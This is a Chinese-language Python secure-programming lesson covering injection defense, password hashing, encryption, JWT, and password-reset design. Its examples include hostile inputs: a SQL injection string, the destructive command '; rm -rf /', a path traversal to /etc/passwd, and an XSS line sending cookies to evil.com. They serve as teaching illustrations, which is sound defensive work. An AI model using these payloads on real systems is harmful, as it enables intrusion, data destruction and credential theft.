# Day 094 — 安全编程

> **输入验证与注入防护 | 密码学基础 | 安全最佳实践 | 安全认证系统**

---

## 📋 今日目标

1. 掌握常见安全漏洞及防护方法
2. 学习 hashlib 和 cryptography 密码学库
3. 理解认证与授权机制
4. 实战：构建安全认证系统

---

## 1. 输入验证与注入防护

### 1.1 常见注入攻击

```
注入攻击的本质: 用户输入被当作代码执行

SQL 注入:
  输入: ' OR '1'='1' --
  生成: SELECT * FROM users WHERE name='' OR '1'='1' --' AND pass='xxx'
  结果: 绕过认证，返回所有用户

命令注入:
  输入: ; rm -rf /
  生成: ls ; rm -rf /
  结果: 删除所有文件

路径遍历:
  输入: ../../etc/passwd
  结果: 读取系统敏感文件

XSS (跨站脚本):
  输入: <script>alert('XSS')</script>
  结果: 在其他用户浏览器执行恶意脚本
```

### 1.2 防护方法

```python
# 1. SQL 注入防护 — 参数化查询
import sqlite3

# ❌ 危险：直接拼接 SQL
def unsafe_query(name):
    sql = f"SELECT * FROM users WHERE name='{name}'"
    cursor.execute(sql)

# ✅ 安全：参数化查询
def safe_query(name):
    sql = "SELECT * FROM users WHERE name=?"
    cursor.execute(sql, (name,))

# 2. 命令注入防护 — 避免 shell=True
import subprocess

# ❌ 危险
subprocess.run(f"ls {user_input}", shell=True)

# ✅ 安全：使用列表传递参数
subprocess.run(["ls", user_input], shell=False)

# 3. 路径遍历防护
import os

# ❌ 危险
path = os.path.join(base_dir, user_input)

# ✅ 安全：规范化路径并验证
safe_path = os.path.normpath(os.path.join(base_dir, user_input))
if not safe_path.startswith(os.path.normpath(base_dir)):
    raise ValueError("路径越界")
```

### 1.3 输入验证库

```python
import re
from typing import Optional

class InputValidator:
    """输入验证工具类"""
    
    @staticmethod
    def validate_email(email: str) -> bool:
        """验证邮箱格式"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return bool(re.match(pattern, email))
    
    @staticmethod
    def validate_username(username: str) -> tuple[bool, str]:
        """验证用户名（3-20位字母数字下划线）"""
        if len(username) < 3:
            return False, "用户名至少3个字符"
        if len(username) > 20:
            return False, "用户名最多20个字符"
        if not re.match(r'^[a-zA-Z0-9_]+$', username):
            return False, "用户名只能包含字母、数字和下划线"
        return True, ""
    
    @staticmethod
    def sanitize_html(text: str) -> str:
        """HTML 转义（防 XSS）"""
        import html
        return html.escape(text)
    
    @staticmethod
    def validate_json(data: dict, required_fields: list) -> tuple[bool, str]:
        """验证 JSON 数据包含必要字段"""
        for field in required_fields:
            if field not in data:
                return False, f"缺少字段: {field}"
        return True, ""
```

---

## 2. 密码学基础

### 2.1 哈希算法

哈希是单向函数，不可逆，用于验证数据完整性。

```
输入 ──► [哈希函数] ──► 固定长度的摘要 (256bit)
"Hello" ──► SHA-256 ──► 185f8db32271fe25f561a6fc938b2e26...

特点:
  - 相同输入 → 相同输出
  - 不同输入 → 不同输出（概率极高）
  - 不可逆（无法从输出推出输入）
  - 雪崩效应（输入改变1位，输出变化巨大）
```

### 2.2 常用哈希算法对比

| 算法 | 输出长度 | 速度 | 安全性 | 推荐场景 |
|------|---------|------|--------|---------|
| MD5 | 128 bit | 快 | ❌ 已破解 | 文件校验（非安全场景）|
| SHA-1 | 160 bit | 快 | ❌ 已破解 | 不推荐 |
| SHA-256 | 256 bit | 中 | ✅ 安全 | 密码存储、数字签名 |
| SHA-512 | 512 bit | 较慢 | ✅ 安全 | 高安全要求场景 |
| bcrypt | 可变 | 慢 | ✅ 安全 | 密码存储（推荐）|

### 2.3 密码存储最佳实践

```python
import hashlib
import secrets
import base64

# ❌ 错误：明文存储密码
password = "my_secret_123"
store_to_db(password)  # 数据库泄露 = 所有密码泄露

# ❌ 错误：简单哈希（无盐）
hashed = hashlib.sha256(password.encode()).hexdigest()
# 彩虹表攻击可以反推

# ❌ 错误：自创哈希算法
hashed = my_custom_hash(password)

# ✅ 正确：使用专业密码哈希算法
import bcrypt

# 生成盐并哈希密码
password = "my_secret_123"
salt = bcrypt.gensalt(rounds=12)  # rounds 越高越安全，但越慢
hashed = bcrypt.hashpw(password.encode(), salt)
# 存储: hashed

# 验证密码
if bcrypt.checkpw(password.encode(), hashed):
    print("密码正确")
else:
    print("密码错误")
```

### 2.4 HMAC — 带密钥的哈希

```python
import hmac
import hashlib

# HMAC 用于验证消息完整性和真实性
# 需要密钥才能生成/验证

secret_key = b'my-secret-key'
message = b'important data'

# 生成 HMAC
hmac_signature = hmac.new(
    secret_key,
    message,
    hashlib.sha256
).hexdigest()

# 验证 HMAC
def verify_hmac(key, message, signature):
    expected = hmac.new(key, message, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, signature)  # 防时序攻击

# 常见用途：API 签名、Webhook 验证、JWT 签名
```

---

## 3. 对称加密与非对称加密

### 3.1 对称加密

同一个密钥用于加密和解密。

```
明文 ──► [加密] ──► 密文
         ↑ 密钥K
         
密文 ──► [解密] ──► 明文
         ↑ 密钥K

AES: 最常用的对称加密算法
  - AES-128: 128位密钥
  - AES-256: 256位密钥（推荐）
  - 分组大小: 128位
  - 模式: CBC, GCM (推荐 GCM，带认证)
```

### 3.2 非对称加密

公钥加密，私钥解密（或反过来）。

```
公钥 (公开)           私钥 (保密)
    │                    │
    ▼                    ▼
明文 ──► [公钥加密] ──► 密文 ──► [私钥解密] ──► 明文

RSA: 最常用的非对称加密算法
  - 密钥长度: 2048位 或 4096位
  - 速度慢，适合加密小数据（如密钥交换）
  
Ed25519: 现代非对称签名算法
  - 密钥短（32字节）
  - 速度快
  - 适合数字签名
```

### 3.3 使用 cryptography 库

```python
# 安装: pip install cryptography

# ========== AES-GCM 对称加密 ==========
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

# 加密
def encrypt_aes(key: bytes, plaintext: bytes) -> bytes:
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)  # 12 字节随机 nonce
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ciphertext

# 解密
def decrypt_aes(key: bytes, data: bytes) -> bytes:
    nonce = data[:12]
    ciphertext = data[12:]
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext, None)

# 生成密钥
key = AESGCM.generate_key(bit_length=256)

# 使用
encrypted = encrypt_aes(key, b"Hello, Security!")
decrypted = decrypt_aes(key, encrypted)
print(decrypted)  # b'Hello, Security!'

# ========== RSA 非对称加密 ==========
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

# 生成密钥对
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# 加密（用公钥）
ciphertext = public_key.encrypt(
    b"Secret message",
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# 解密（用私钥）
plaintext = private_key.decrypt(
    ciphertext,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)
print(plaintext)  # b'Secret message'
```

---

## 4. JWT (JSON Web Token)

### 4.1 JWT 结构

```
Header.Payload.Signature

Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "1234567890", "name": "John", "iat": 1516239022}
Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)

base64(Header).base64(Payload).base64(Signature)
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### 4.2 JWT 实现

```python
import jwt
import datetime

SECRET_KEY = "your-secret-key-keep-it-safe"

def create_token(user_id: str, username: str) -> str:
    """创建 JWT Token"""
    payload = {
        "sub": user_id,
        "username": username,
        "iat": datetime.datetime.utcnow(),
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24),
        "type": "access"
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

def verify_token(token: str) -> dict:
    """验证 JWT Token"""
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return {"valid": True, "payload": payload}
    except jwt.ExpiredSignatureError:
        return {"valid": False, "error": "Token 已过期"}
    except jwt.InvalidTokenError:
        return {"valid": False, "error": "无效 Token"}

# 使用
token = create_token("user_001", "张三")
result = verify_token(token)
print(result)  # {'valid': True, 'payload': {...}}
```

---

## 5. 安全最佳实践清单

```
输入验证:
  ✅ 永远不要信任用户输入
  ✅ 白名单验证（允许的格式）而非黑名单
  ✅ 对所有输出进行转义
  ✅ 使用参数化查询防止 SQL 注入

密码安全:
  ✅ 使用 bcrypt/argon2 存储密码
  ✅ 每个密码使用独立的盐
  ✅ 密码强度要求（最少 8 位，包含大小写+数字）
  ❌ 不要用 MD5/SHA 存储密码
  ❌ 不要用自创加密算法

传输安全:
  ✅ 使用 TLS/HTTPS
  ✅ 验证证书
  ✅ 使用现代密码套件

认证授权:
  ✅ 使用 JWT 或 Session 管理登录状态
  ✅ 设置 Token 过期时间
  ✅ 实现速率限制（防暴力破解）
  ✅ 记录安全日志

密钥管理:
  ✅ 密钥存储在环境变量或密钥管理服务中
  ✅ 不要硬编码密钥
  ✅ 定期轮换密钥
  ❌ 不要把密钥提交到 Git
```

---

## 6. 思考题

1. **为什么 bcrypt 比 SHA-256 更适合存储密码？** 提示：考虑彩虹表和暴力破解

**参考答案**

差别不在「哈希强度」，而在**速度**和**盐**。SHA-256 是为「快速校验文件完整性」设计的通用哈希，一块普通 GPU 每秒能算几十亿次；bcrypt 是专门为密码设计的**慢哈希**，用 `rounds`（成本因子，每加 1 计算量翻倍）故意把单次校验拖到几十~几百毫秒。用户登录多等 100 ms 毫无感觉，但攻击者拖库后想暴力枚举，成本就被放大了上亿倍。

第二个差别是**盐（salt）**：bcrypt 每次 `gensalt()` 生成随机盐并把盐编进结果字符串，所以两个人用同一个密码，存下来的哈希也不同。攻击者既无法「一次破解全库」，也无法用**彩虹表**（预先算好的「常见密码 → 哈希」对照表）直接反查。裸 SHA-256 没有盐，`sha256("123456")` 全网都是同一个值，查表即中。

第三，bcrypt 的结果自带算法标识、成本因子和盐（形如 `$2b$12$<22字符盐><31字符哈希>`），`checkpw` 会自动解析，不用额外建字段存盐；而且成本因子可以随硬件进步逐年调高，旧哈希仍能被验证。argon2id 在此基础上加了「内存硬化」，更抗 GPU/ASIC，是目前的更优选。

下面用标准库演示「加盐」和「故意变慢」这两个核心思想（bcrypt 本身需 `pip install bcrypt`）：

```python
import hashlib
import secrets

password = "my_secret_123"

# ❌ 裸 SHA-256：同一密码永远得到同一摘要，可被彩虹表反查
plain = hashlib.sha256(password.encode()).hexdigest()
print("裸 SHA-256 摘要   :", plain[:32], "...")
print("再算一次是否相同  :", plain == hashlib.sha256(password.encode()).hexdigest())

# ✅ 加盐：每个用户一份随机盐，同一密码得到不同摘要
salt1 = secrets.token_hex(16)
salt2 = secrets.token_hex(16)
h1 = hashlib.sha256(salt1.encode() + password.encode()).hexdigest()
h2 = hashlib.sha256(salt2.encode() + password.encode()).hexdigest()
print("两份加盐摘要相同  :", h1 == h2)

# ✅ 再加「慢」：PBKDF2 故意迭代几十万次，抬高暴力破解成本
#    bcrypt/argon2 同理，而且它们还额外抗 GPU/ASIC 并行
dk = hashlib.pbkdf2_hmac("sha256", password.encode(), salt1.encode(), 200_000)
print("PBKDF2 摘要长度   :", len(dk), "字节")
print("校验正确密码      :", dk == hashlib.pbkdf2_hmac(
    "sha256", password.encode(), salt1.encode(), 200_000))
print("校验错误密码      :", dk == hashlib.pbkdf2_hmac(
    "sha256", b"wrong-password", salt1.encode(), 200_000))
```

运行输出（已验证）：

```
裸 SHA-256 摘要   : b77f68a3acbc9173be96f05789c679ec ...
再算一次是否相同  : True
两份加盐摘要相同  : False
PBKDF2 摘要长度   : 32 字节
校验正确密码      : True
校验错误密码      : False
```

可以看到：裸哈希是「确定性的」，所以能被预计算反查；加了随机盐后同一密码的两份摘要完全不同；PBKDF2 用 20 万次迭代把单次计算变慢，校验时只要用同样的盐和迭代次数重算一遍比对即可。

⚠️ 注意：别用「SHA-256 套很多层」或自创算法代替 bcrypt——迭代次数不可配置、无盐、无算法标识，而且对 GPU 友好。标准库的 `hashlib.pbkdf2_hmac` 是可接受的退路，但优先选 bcrypt / argon2id。

2. **JWT Token 过期后如何实现无感刷新？** 提示：双 Token 机制

**参考答案**

用**双 Token**：`access_token` 短命（5~15 分钟），随每次业务请求发送；`refresh_token` 长命（7~30 天），只在 access 过期时发给专门的刷新接口。access 寿命短，即使泄露也很快失效；refresh 使用频率极低，暴露面小得多。

无感刷新的典型流程：

1. 前端拦截器发现业务接口返回 401（或本地判断 access 即将过期）；
2. 自动调 `POST /auth/refresh`，带上 refresh_token 换回新的 access_token；
3. 用新 access **重放刚才失败的那个请求**，用户完全看不到中断；
4. 只有 refresh 也失败（过期/被吊销）时，才跳登录页。

三个必须处理的细节：**并发去重**——同一时刻多个请求都 401，只能发一次刷新，其余请求排队等同一个 Promise，否则会互相把对方刚拿到的 refresh 顶掉；**刷新令牌轮换（rotation）**——每次刷新都作废旧 refresh、签发新的，一旦检测到「已作废的 refresh 又被使用」，说明可能被盗，立即吊销该用户整条令牌链；**存储位置**——refresh 放 `HttpOnly` + `Secure` + `SameSite=Strict` 的 Cookie（JS 读不到），access 放内存变量而不是 localStorage。

小例子：access 15 分钟过期，用户连续操作 2 小时，前端在第 15、30、45…分钟各静默刷新一次；用户只在 30 天后 refresh 过期时才需要重新登录。

💡 提示：JWT 是无状态的，服务端「吊销」需要额外手段——维护黑名单（放 Redis，TTL 设为令牌剩余寿命），或在 payload 里放 `token_version`，改密码/登出时递增版本号让旧令牌全部失效。

3. **如何防止 JWT 被盗用？** 提示：考虑 HTTPS、HttpOnly Cookie、Token 绑定

**参考答案**

JWT 是**持有即有效（bearer token）**：谁拿到都能用，签名只防篡改、不防冒用。所以思路是「尽量不被偷」+「偷了也用不久、用不了」。

- **传输层**：全站 HTTPS + HSTS；绝不用 URL 查询串携带 token，因为它会进浏览器历史、服务器访问日志和 Referer 头。
- **存储层**：放 `HttpOnly` Cookie 让 XSS 脚本读不到，配 `Secure`（仅 HTTPS 发送）和 `SameSite=Lax/Strict`（挡 CSRF）。若必须放前端，就只存内存变量，别用 localStorage——一次 XSS 就能全捞走。同时用 CSP 和输出转义把 XSS 本身堵住。
- **缩短寿命 + 可吊销**：access 只给 5~15 分钟，配合双 Token 刷新；再用 Redis 黑名单或 `token_version`，让用户登出、改密码、报告异常时能立刻作废令牌。
- **绑定上下文**：payload 里记 `jti`（令牌唯一 ID）和签发时的 IP 段/设备指纹/User-Agent，校验时比对，异常就要求二次验证；更严格可用 mTLS 或 DPoP 把令牌绑到客户端私钥上，光有 token 没有私钥也用不了。
- **签名与算法**：密钥足够长且只存服务端（环境变量/KMS，不进 Git）；`jwt.decode` 必须显式传 `algorithms=["HS256"]`，否则可能被 `alg: none`，或「把 RS256 换成 HS256、拿公开的公钥当 HMAC 密钥」的算法混淆攻击绕过。

小例子：把 token 存进 `HttpOnly` Cookie 后，即使页面被注入 `<script>fetch('//evil.com?c='+document.cookie)</script>`，`document.cookie` 也读不到这个令牌。

⚠️ 注意：`HttpOnly` 只防「读走」，不防「借用」——XSS 脚本仍能以用户身份直接在页面里发请求。所以 XSS 防护和 CSP 一样都不能省。

4. **对称加密和非对称加密分别适合什么场景？为什么？**

**参考答案**

**对称加密（AES）适合「大量数据的机密性」**：加解密用同一把密钥，底层是位运算和查表，速度极快（现代 CPU 有 AES-NI 硬件指令，可达每秒 GB 级），密文长度也和明文基本相当。缺点是**密钥分发难**——双方必须先安全地共享同一把密钥，密钥在途中被截获就全盘皆输；n 个人两两通信需要 n(n-1)/2 把密钥，管理成本爆炸。

**非对称加密（RSA/ECC）适合「密钥交换、数字签名、身份认证」**：公钥可以随便公开、私钥自己留着，天生解决了分发问题，n 个人只需 n 对密钥。但它是大数模幂/椭圆曲线运算，比 AES 慢几百到上千倍，而且 RSA 一次只能加密比密钥还短的数据（2048 位密钥配 OAEP 填充最多约 190 字节）。

所以真实系统都用**混合加密**：先用非对称算法安全协商出一把临时的对称会话密钥，之后所有业务数据都用这把对称密钥加密。TLS 握手就是这个套路（ECDHE 协商密钥 + AES-GCM 传数据）。

场景对照：加密数据库字段、备份文件、磁盘 → AES-GCM；给 API 请求签名、验证软件更新包来源、SSH/Git 登录 → Ed25519/RSA 签名；给陌生人发加密邮件 → 用对方公钥加密。

⚠️ 注意：签名和加密是两件事——「私钥签名、公钥验签」证明来源与完整性，「公钥加密、私钥解密」保证机密性。另外 AES 要选带认证的模式（GCM），纯 CBC 只保密不防篡改，且同一密钥下 nonce 绝不能重复。

5. **如何设计一个安全的密码重置流程？** 提示：考虑时序、一次性 Token、通知用户

**参考答案**

一个安全的重置流程要同时满足「不可猜测、限时、一次性、用户可感知、不泄露账号是否存在」：

1. **申请**：用户提交邮箱/手机号。无论账号是否存在都返回同一句「如果该邮箱已注册，我们已发送重置邮件」，避免被用来枚举用户；同时做速率限制（同一邮箱/IP 每小时几次）防短信轰炸。
2. **生成令牌**：用 `secrets.token_urlsafe(32)` 生成 256 位随机熵（绝不能用 `random`、时间戳或自增 ID）。数据库只存令牌的 **HMAC/哈希**，明文只出现在邮件链接里——这样库被拖走也无法直接冒用。
3. **限时 + 一次性**：有效期 15~30 分钟，`used` 标记一旦校验通过立刻置位；同一用户申请新令牌时作废旧令牌。
4. **重置**：校验通过后要求输入新密码（走强度校验），写入 bcrypt 哈希，**并作废该用户所有已有会话和 refresh token**，防止攻击者的旧会话继续存活。
5. **通知**：申请时和重置成功后都给用户发邮件/短信（「你的密码刚刚被修改，若非本人操作请立即联系客服」），让用户第一时间发现异常。

下面用标准库演示令牌的核心校验逻辑（真实项目把 `reset_store` 换成数据库、把密码写入换成 bcrypt）：

```python
import hashlib
import hmac
import secrets
import time

# 服务端只存「令牌的哈希」，不存明文；库被拖走也无法直接冒用
reset_store = {}
TTL = 15 * 60                      # 15 分钟有效期
PEPPER = b"server-side-pepper"     # 额外一层服务端密钥，只存在配置里


def _hash(token: str) -> str:
    # 用 HMAC 而非裸哈希，避免令牌库泄露后被离线反查
    return hmac.new(PEPPER, token.encode(), hashlib.sha256).hexdigest()


def issue_reset_token(user_id: str) -> str:
    token = secrets.token_urlsafe(32)   # 256 位随机熵，不可猜测
    reset_store[_hash(token)] = {
        "user_id": user_id,
        "expires": time.time() + TTL,
        "used": False,                  # 一次性
    }
    return token                        # 只通过邮件发给用户，不写日志


def consume_reset_token(token: str, new_password: str) -> str:
    rec = reset_store.get(_hash(token))
    if rec is None:
        return "拒绝：令牌不存在"
    if rec["used"]:
        return "拒绝：令牌已使用过"
    if time.time() > rec["expires"]:
        return "拒绝：令牌已过期"
    rec["used"] = True                  # 立刻标记，防重放
    # 真实项目这里写入 bcrypt 哈希，并作废该用户其它会话
    return f"成功：{rec['user_id']} 的密码已重置为 {new_password!r}"


tok = issue_reset_token("u1001")
print("令牌长度   :", len(tok))
print("第一次使用 :", consume_reset_token(tok, "NewPass123"))
print("第二次使用 :", consume_reset_token(tok, "HackerPass"))
print("伪造令牌   :", consume_reset_token(secrets.token_urlsafe(32), "x"))

# 过期演示：把有效期改成已经过去的时间点
tok2 = issue_reset_token("u1002")
reset_store[_hash(tok2)]["expires"] = time.time() - 1
print("过期令牌   :", consume_reset_token(tok2, "y"))
```

运行输出（已验证）：

```
令牌长度   : 43
第一次使用 : 成功：u1001 的密码已重置为 'NewPass123'
第二次使用 : 拒绝：令牌已使用过
伪造令牌   : 拒绝：令牌不存在
过期令牌   : 拒绝：令牌已过期
```

`token_urlsafe(32)` 用 32 字节随机数做 Base64URL 编码，得到 43 个字符，熵足够大以致无法暴力猜测；`used` 标记让同一个链接只能用一次；过期检查把可用窗口限制在 15 分钟内；存哈希而非明文则保证「数据库泄露 ≠ 令牌泄露」。

💡 提示：重置链接里的 token 不要写进日志，落地页也别加载第三方资源——Referer 头可能把带 token 的 URL 泄露出去，建议加 `Referrer-Policy: no-referrer`。若需要直接比较令牌字符串，用 `hmac.compare_digest()` 而不是 `==`，避免时序攻击。

---

## 📚 扩展阅读

- [Python hashlib 官方文档](https://docs.python.org/3/library/hashlib.html)
- [cryptography 库文档](https://cryptography.io/en/latest/)
- [OWASP Top 10 安全风险](https://owasp.org/www-project-top-ten/)
- [JWT 规范 (RFC 7519)](https://tools.ietf.org/html/rfc7519)
